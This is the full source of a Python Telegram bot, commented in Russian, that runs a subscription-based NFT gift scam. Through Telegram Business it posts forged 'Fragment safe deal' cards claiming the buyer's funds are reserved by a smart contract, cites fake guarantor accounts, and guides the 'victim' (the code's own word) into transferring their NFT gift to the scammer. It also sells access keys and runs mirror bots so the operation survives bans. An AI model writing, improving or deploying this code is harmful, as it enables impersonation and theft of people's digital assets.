import os
import re
import uuid
import asyncio
import logging
import sys
import random
import string
import sqlite3
import time
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                           InlineKeyboardMarkup, BusinessConnection)
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from dotenv import load_dotenv

load_dotenv()
logging.basicConfig(level=logging.INFO, stream=sys.stdout)
log = logging.getLogger("offerbot")

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
DEFAULT_RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")
DB_PATH = os.getenv("DB_PATH", "/data/bot.db")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

# ==========================================
# БАЗА ДАННЫХ
# ==========================================
def get_db():
    os.makedirs(os.path.dirname(DB_PATH) or ".", exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute("""CREATE TABLE IF NOT EXISTS business_conns (
            user_id INTEGER PRIMARY KEY, conn_id TEXT
        )""")
        
        conn.execute("""CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, subscribed INTEGER DEFAULT 0,
            sub_type TEXT DEFAULT 'none', test_used INTEGER DEFAULT 0, 
            my_username TEXT, stats_created INTEGER DEFAULT 0, stats_accepted INTEGER DEFAULT 0
        )""")
        
        conn.execute("DROP TABLE IF EXISTS offers")
        conn.execute("""CREATE TABLE IF NOT EXISTS offers (
            id TEXT PRIMARY KEY, nft_name TEXT, nft_slug TEXT, 
            price_amount TEXT, price_currency TEXT, buyer_id INTEGER, 
            buyer_username TEXT, target_user TEXT, message_id INTEGER, conn_id TEXT,
            created_at INTEGER
        )""")
        
        conn.execute("""CREATE TABLE IF NOT EXISTS mirrors (
            id INTEGER PRIMARY KEY AUTOINCREMENT, 
            token TEXT UNIQUE, 
            username TEXT,
            added_by INTEGER
        )""")
        
        conn.execute("CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY)")
        
        cur = conn.execute("SELECT COUNT(*) FROM keys")
        if cur.fetchone()[0] == 0:
            for _ in range(100):
                key = "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
                conn.execute("INSERT INTO keys (key) VALUES (?)", (key,))

init_db()

# ==========================================
# РЕГУЛЯРКИ
# ==========================================
NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
CODE_RE = re.compile(r"(of_[a-f0-9]{5})", re.I)
KEY_RE = re.compile(r"^(TG-[A-Z0-9]{6})$", re.I)

def parse_nft(url: str):
    m = NFT_RE.search(url)
    if not m: return None
    slug_raw = m.group(1)
    parts = slug_raw.rsplit("-", 1)
    name_raw, num = (parts[0], parts[1]) if len(parts) == 2 and parts[1].isdigit() else (slug_raw, "")
    display = re.sub(r"(?<!^)(?=[A-Z])", " ", name_raw).strip()
    return {"slug": slug_raw, "name": f"{display} #{num}" if num else display}

def parse_price(text: str):
    m = PRICE_RE.search(text)
    if not m: return None
    amount, unit = m.group(1), m.group(2).lower()
    if unit in ("gram", "грам", "grams"): return (amount, "Gram")
    return (amount, "Stars")

# ==========================================
# ОТПРАВКА / УДАЛЕНИЕ
# ==========================================
async def safe_send(bot_instance: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=3):
    for attempt in range(retries):
        try:
            return await bot_instance.send_message(
                chat_id=chat_id, text=text, business_connection_id=conn_id,
                reply_markup=reply_markup,
                disable_web_page_preview=False
            )
        except TelegramBadRequest as e:
            if "PEER_FLOOD" in str(e): 
                await asyncio.sleep(30)
            else:
                log.error(f"Ошибка Telegram: {e}")
                return None
        except Exception as e:
            log.error(f"Ошибка: {e}")
            return None
    return None

async def delete_code_message(bot_instance: Bot, chat_id: int, msg_id: int, conn_id: str):
    try: 
        await bot_instance.delete_business_messages(business_connection_id=conn_id, message_ids=[msg_id])
    except Exception:
        try: 
            await bot_instance.edit_message_text(text=" ", chat_id=chat_id, message_id=msg_id, business_connection_id=conn_id)
        except Exception: 
            pass

# ==========================================
# BUSINESS CONNECTION
# ==========================================
@router.business_connection()
async def on_business_conn(conn: BusinessConnection):
    with get_db() as db_conn:
        db_conn.execute("INSERT OR REPLACE INTO business_conns (user_id, conn_id) VALUES (?, ?)", 
                        (conn.user.id, conn.id))
    log.info(f"✅ Business: user={conn.user.id} id={conn.id}")

# ==========================================
# МЕНЮ
# ==========================================
async def show_main_menu(target, uid):
    with get_db() as conn:
        user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
    
    if not user:
        with get_db() as conn:
            conn.execute("INSERT INTO users (user_id, my_username) VALUES (?, ?)", (uid, DEFAULT_RECEIVER))
        user = {"subscribed": 0, "test_used": 0, "stats_created": 0, "stats_accepted": 0, "my_username": DEFAULT_RECEIVER}
    
    status = "✅ Активна" if user["subscribed"] else ("🎁 Тест-доступ" if user["test_used"] == 0 else "❌ Нет доступа")
    
    text = (
        f"👑 <b>NFT Trade Panel</b>\n\n"
        f"Статус: <b>{status}</b>\n"
        f"Создано офферов: <b>{user['stats_created']}</b>\n"
        f"Успешных передач: <b>{user['stats_accepted']}</b>\n\n"
        f"<b>Создать оффер:</b>\n<code>/offer [ссылка] [цена] [@юзер]</code>"
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Создать оффер", callback_data="create_offer_btn")],
        [InlineKeyboardButton(text="🪞 Зеркала", callback_data="mirrors_menu")],
        [InlineKeyboardButton(text="⚙️ Настройки", callback_data="settings")],
        [InlineKeyboardButton(text="💎 Подписка", callback_data="buy_sub")]
    ])
    
    if isinstance(target, Message): await target.reply(text, reply_markup=kb)
    else: await target.message.edit_text(text, reply_markup=kb)

@router.message(Command("start"))
async def cmd_start(msg: Message):
    if msg.from_user.id == ADMIN_ID:
        await msg.reply(
            "👑 <b>Админ:</b>\n"
            "/keys — ключи\n"
            "/set_default @ник — сменить получателя\n"
            "/addkey — создать ключ\n"
            "/setbotmax [токен] — добавить зеркало\n"
            "/restartbots — перезапустить всех ботов"
        )
        return
    await show_main_menu(msg, msg.from_user.id)

@router.callback_query(F.data == "main_menu")
async def cb_main_menu(cb: CallbackQuery):
    await show_main_menu(cb, cb.from_user.id)
    await cb.answer()

# ==========================================
# ЗЕРКАЛА
# ==========================================
@router.callback_query(F.data == "mirrors_menu")
async def cb_mirrors_menu(cb: CallbackQuery):
    with get_db() as conn:
        mirrors = conn.execute("SELECT * FROM mirrors").fetchall()
    
    text = "🪞 <b>Зеркала бота</b>\n\nЕсли этот бот не отвечает, перейдите на одно из зеркал ниже. Ваша подписка сохранится:" if mirrors else "🪞 <b>Зеркала</b>\n\nСписок пока пуст."
    
    kb_list = []
    for m in mirrors:
        link = f"https://t.me/{m['username']}"
        kb_list.append([InlineKeyboardButton(text=f"🔹 {m['username']}", url=link)])
    
    kb_list.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")])
    await cb.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_list))
    await cb.answer()

# ==========================================
# НАСТРОЙКИ
# ==========================================
@router.callback_query(F.data == "settings")
async def cb_settings(cb: CallbackQuery):
    uid = cb.from_user.id
    with get_db() as conn:
        user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
    curr = user["my_username"] if user and user["my_username"] else DEFAULT_RECEIVER
    
    text = (
        f"<b>⚙️ Настройки профиля</b>\n\n"
        f"Ваш текущий ник в офферах: <b>@{curr}</b>\n\n"
        f"<b>Доступные команды:</b>\n"
        f"▪️ <code>/setuser @ник</code> — сменить ник\n"
        f"▪️ <code>/offer [ссылка] [цена] [@юзер]</code> — создать оффер\n"
        f"▪️ <code>/key TG-XXXXXX</code> — активировать подписку\n"
        f"▪️ <code>/cancel_of_XXXXX</code> — отменить оффер\n"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]])
    await cb.message.edit_text(text, reply_markup=kb)
    await cb.answer()

# ==========================================
# ПОДПИСКА
# ==========================================
@router.callback_query(F.data == "create_offer_btn")
async def cb_create_offer(cb: CallbackQuery):
    await cb.message.edit_text(
        "📝 <b>Формат:</b>\n<code>/offer [ссылка] [цена] [@username]</code>\n\n"
        "Пример:\n<code>/offer https://t.me/nft/MirageLamp-73768 1500 stars @target</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]])
    )
    await cb.answer()

@router.callback_query(F.data == "buy_sub")
async def cb_buy_sub(cb: CallbackQuery):
    text = (
        "<b>💎 Подписка NFT Trade</b>\n\n"
        "• <b>Месяц</b> — 50 ⭐️\n"
        "• <b>Год</b> — 100 ⭐️\n"
        "• <b>Навсегда</b> — 200 ⭐️\n\n"
        f"Переведите звезды на: <b>@{DEFAULT_RECEIVER}</b>\n"
        "После оплаты введите: <code>/key TG-XXXXXX</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Оплатить", url=f"https://t.me/{DEFAULT_RECEIVER}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
    ])
    await cb.message.edit_text(text, reply_markup=kb)
    await cb.answer()

@router.message(Command("key"))
async def cmd_key(msg: Message):
    parts = msg.text.split()
    if len(parts) < 2: return await msg.reply("❌ /key TG-XXXXXX")
    key = parts[1].upper()
    uid = msg.from_user.id
    with get_db() as conn:
        if conn.execute("SELECT key FROM keys WHERE key=?", (key,)).fetchone():
            conn.execute("DELETE FROM keys WHERE key=?", (key,))
            conn.execute("UPDATE users SET subscribed=1 WHERE user_id=?", (uid,))
            await msg.reply("✅ Ключ активирован!")
            await show_main_menu(msg, uid)
        else:
            await msg.reply("❌ Неверный ключ.")

@router.message(Command("setuser"))
async def cmd_setuser(msg: Message):
    uid = msg.from_user.id
    parts = msg.text.split()
    if len(parts) < 2 or not parts[1].startswith("@"):
        return await msg.reply("❌ Формат: <code>/setuser @ваш_ник</code>")
    
    new_rec = parts[1].replace("@", "").strip()
    with get_db() as conn:
        user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
        if not user: conn.execute("INSERT INTO users (user_id, subscribed, my_username) VALUES (?, 0, ?)", (uid, new_rec))
        else: conn.execute("UPDATE users SET my_username=? WHERE user_id=?", (new_rec, uid))
    await msg.reply(f"✅ Юзернейм в офферах изменен на <b>@{new_rec}</b>.")

# ==========================================
# СОЗДАНИЕ ОФФЕРА
# ==========================================
@router.message(F.text.regexp(r"^/offer\s+"))
async def cmd_offer(msg: Message):
    uid = msg.from_user.id
    is_admin = (uid == ADMIN_ID)
    
    with get_db() as conn:
        user = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
    
    is_test = False
    if not is_admin:
        if not user["subscribed"]:
            if user["test_used"] == 0: is_test = True
            else: return await msg.reply("❌ Подписка не активна. /start")

    if uid not in BUSINESS_CONNS and not is_admin:
        return await msg.reply("❌ Ошибка: Подключите бота к Telegram Business!")

    parts = msg.text.replace("/offer", "").strip().split()
    if len(parts) < 3: return await msg.reply("❌ /offer [ссылка] [цена] [@юзер]")

    url, target_user = parts[0], parts[-1]
    price_text = " ".join(parts[1:-1])
    nft, price_data = parse_nft(url), parse_price(price_text)
    
    if not nft: return await msg.reply("❌ Не понял ссылку на подарок.")
    if not price_data: price_data = ("0", "Stars")

    oid = "of_" + uuid.uuid4().hex[:5]
    buyer_name = user["my_username"] if not is_admin and user else msg.from_user.username
    now = int(time.time())
    
    with get_db() as conn:
        conn.execute(
            "INSERT INTO offers (id, nft_name, nft_slug, price_amount, price_currency, buyer_id, buyer_username, target_user, created_at) VALUES (?,?,?,?,?,?,?,?,?)",
            (oid, nft["name"], nft["slug"], price_data[0], price_data[1], uid, buyer_name, target_user, now)
        )
        if is_test: conn.execute("UPDATE users SET test_used=1 WHERE user_id=?", (uid,))
        else: conn.execute("UPDATE users SET stats_created = stats_created + 1 WHERE user_id=?", (uid,))
        
    prefix = "🎁 <b>Тестовый оффер!</b>\n\n" if is_test else ""
    await msg.reply(f"{prefix}✅ Оффер <code>{oid}</code> создан.\n\nОтправьте этот код в чат с жертвой.\n/cancel_{oid} — отменить.")

@router.message(F.text.regexp(r"^/cancel_(of_[a-f0-9]{5})$"))
async def cmd_cancel_offer(msg: Message):
    oid = msg.text.replace("/cancel_", "").strip()
    with get_db() as conn:
        offer = conn.execute("SELECT * FROM offers WHERE id=? AND buyer_id=?", (oid, msg.from_user.id)).fetchone()
        if offer:
            if offer["message_id"] and offer["conn_id"]:
                asyncio.create_task(delete_code_message(msg.bot, offer["buyer_id"], offer["message_id"], offer["conn_id"]))
            conn.execute("DELETE FROM offers WHERE id=?", (oid,))
            await msg.reply("🗑 Оффер отменен и удален из чата.")
        else: await msg.reply("❌ Не найден.")

# ==========================================
# ОТПРАВКА ОФФЕРА (ГЛАВНЫЙ ФИКС)
# ==========================================
@router.business_message(F.text)
async def handle_business_message(msg: Message):
    if msg.from_user and msg.from_user.is_bot: return

    m = CODE_RE.search(msg.text)
    if not m: return
    oid = m.group(1).lower()
    
    with get_db() as conn:
        offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
    
    if not offer: 
        log.error("❌ Оффер не найден в БД")
        return
    if msg.from_user.id != offer["buyer_id"]: 
        log.error("❌ Чужой отправитель")
        return

    # 1. Сначала пытаемся взять conn_id из самого сообщения (это самый надежный способ)
    conn_id = getattr(msg, "business_connection_id", None)
    
    # 2. Если в сообщении его нет, лезем в базу данных
    if not conn_id:
        with get_db() as db_conn:
            row = db_conn.execute("SELECT conn_id FROM business_conns WHERE user_id=?", (msg.from_user.id,)).fetchone()
        if row:
            conn_id = row["conn_id"]

    if not conn_id: 
        log.error("❌ Нет conn_id ни в сообщении, ни в базе")
        return

    await delete_code_message(msg.bot, msg.chat.id, msg.message_id, conn_id)
    await asyncio.sleep(1.5)

    price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
    nft_link = f"https://t.me/nft/{offer['nft_slug']}"

    card_text = (
        f"{nft_link}\n\n" 
        f"<b>🛡 Fragment · Безопасная сделка #{oid.upper()[3:]}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Уведомление о зарезервированной сделке</b>\n\n"
        f"Пользователь <b>@{offer['buyer_username']}</b> инициировал безопасный обмен вашего подарка <b>{offer['nft_name']}</b> на <b>{price_str}</b>.\n\n"
        f"✅ <b>Статус:</b> Средства успешно зарезервированы смарт-контрактом.\n"
        f"🔒 <b>Гаранты:</b> <a href='https://t.me/TelegramSuporteDeDados'>@TelegramSuporteDeDados</a>, <a href='https://t.me/notoscam'>@notoscam</a>\n"
        f"⏱ <b>Лимит времени:</b> 6 часов до отмены резерва.\n\n"
        f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
         InlineKeyboardButton(text="Принять", callback_data=f"accept1:{oid}")]
    ])
    
    sent = await safe_send(msg.bot, msg.chat.id, card_text, conn_id, reply_markup=kb)
    
    if sent:
        log.info(f"✅ Карточка отправлена: {sent.message_id}")
        with get_db() as conn:
            conn.execute("UPDATE offers SET message_id=?, conn_id=? WHERE id=?", (sent.message_id, conn_id, oid))
    else:
        log.error("❌ safe_send вернул None")

# ==========================================
# КНОПКИ
# ==========================================
@router.callback_query(F.data.startswith("accept1:"))
async def on_accept1(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    with get_db() as conn:
        offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
        if offer:
            conn.execute("UPDATE users SET stats_accepted = stats_accepted + 1 WHERE user_id=?", (offer["buyer_id"],))
    
    if not offer: return
    price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
    
    await cb.message.edit_text(
        f"<b>Сумма {price_str} зарезервирована.</b>\n\n"
        f"Чтобы завершить сделку:\n"
        f"1. Ознакомьтесь с условиями.\n"
        f"2. Нажмите «Передать NFT».",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Передать NFT", callback_data=f"accept2:{oid}")]])
    )
    await cb.answer()

@router.callback_query(F.data.startswith("accept2:"))
async def on_accept2(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    with get_db() as conn:
        offer = conn.execute("SELECT * FROM offers WHERE id=?", (oid,)).fetchone()
    if not offer: return
    
    native_url = f"tg://send_gift?slug={offer['nft_slug']}"
    await cb.message.edit_text(
        f"<b>Инструкция по передаче:</b>\n\n"
        f"1. Нажмите на кнопку ниже.\n"
        f"2. Выберите «Передать NFT».\n"
        f"3. Укажите получателя: <b>@{offer['buyer_username']}</b>.\n"
        f"4. Подтвердите.\n\n"
        f"👇 Меню передачи откроется автоматически:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Передать NFT ↗", url=native_url)]])
    )
    await cb.answer()

@router.callback_query(F.data.startswith("reject:"))
async def on_reject(cb: CallbackQuery):
    await cb.message.edit_reply_markup(reply_markup=None)
    await cb.answer("Вы отклонили предложение.")

# ==========================================
# АДМИН
# ==========================================
@router.message(Command("keys"))
async def cmd_keys(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    with get_db() as conn:
        keys = conn.execute("SELECT key FROM keys LIMIT 30").fetchall()
        total = conn.execute("SELECT COUNT(*) FROM keys").fetchone()[0]
    keys_list = "\n".join([k["key"] for k in keys])
    await msg.reply(f"<b>Ключи ({total}):</b>\n<code>{keys_list}</code>...")

@router.message(Command("addkey"))
async def cmd_addkey(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    key = "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
    with get_db() as conn:
        conn.execute("INSERT INTO keys (key) VALUES (?)", (key,))
    await msg.reply(f"✅ Ключ создан: <code>{key}</code>")

@router.message(F.text.regexp(r"^/set_default\s+"))
async def cmd_set_default(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    global DEFAULT_RECEIVER
    new_rec = msg.text.replace("/set_default", "").strip().replace("@", "")
    DEFAULT_RECEIVER = new_rec
    await msg.reply(f"✅ Дефолтный получатель: @{new_rec}")

@router.message(F.text.regexp(r"^/setbotmax\s+"))
async def cmd_setbotmax(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    
    parts = msg.text.split()
    if len(parts) < 2: return await msg.reply("❌ /setbotmax [ТОКЕН_БОТА]")
    
    token = parts[1]
    
    try:
        temp_bot = Bot(token=token)
        await temp_bot.delete_webhook(drop_pending_updates=True)
        me = await temp_bot.get_me()
        username = me.username
        
        with get_db() as conn:
            conn.execute("INSERT OR REPLACE INTO mirrors (token, username, added_by) VALUES (?, ?, ?)", (token, username, msg.from_user.id))
        
        await msg.reply(f"✅ Зеркало <b>@{username}</b> сохранено. Напиши /restartbots чтобы запустить.")
    except Exception as e:
        await msg.reply(f"❌ Ошибка: {e}")

@router.message(Command("restartbots"))
async def cmd_restartbots(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.reply("🔄 Перезапускаю...")
    os._exit(0) 

# ==========================================
# ЗАПУСК ВСЕХ БОТОВ
# ==========================================
async def main():
    log.info("Starting all bots...")
    
    bots_to_start = [bot]
    
    with get_db() as conn:
        mirrors = conn.execute("SELECT token, username FROM mirrors").fetchall()
    
    for m in mirrors:
        try:
            m_bot = Bot(token=m["token"], default=DefaultBotProperties(parse_mode=ParseMode.HTML))
            await m_bot.delete_webhook(drop_pending_updates=True)
            bots_to_start.append(m_bot)
            log.info(f"🚀 Загружено зеркало: @{m['username']}")
        except Exception as e:
            log.error(f"Ошибка загрузки @{m['username']}: {e}")

    await bot.delete_webhook(drop_pending_updates=True)

    await dp.start_polling(*bots_to_start)

if __name__ == "__main__":
    asyncio.run(main())
